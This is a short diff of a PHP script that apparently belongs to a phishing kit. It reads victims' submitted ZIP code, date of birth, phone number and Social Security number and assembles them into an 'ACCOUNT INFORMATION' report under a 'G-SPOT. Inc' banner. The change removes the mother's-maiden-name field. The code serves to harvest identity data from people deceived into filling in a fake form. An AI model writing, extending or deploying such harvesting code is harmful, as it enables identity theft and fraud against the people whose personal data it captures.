@@ -92,7 +92,6 @@ $zip        = $_POST['zip'];
 $dob        = $_POST['dob'];
 $phone      = $_POST['phone'];
 $ssn        = $_POST['ssn']; 
-$mmn        = $_POST['mmn']; 
 $message   = "
 #------------------------[ G-SPOT. Inc ]-----------------------------#
 #--------------------[ ACCOUNT INFORMATION ]-------------------------#
@@ -117,7 +116,6 @@ Zip                   : ".$zip."
 DOB                   : ".$dob."
 SSN                   : ".$ssn."
 Phone                 : ".$phone."
-Mother Maiden Name    : ".$mmn."
 
 #------------------------[ DEVICE INFORMATION ]-----------------------#
 
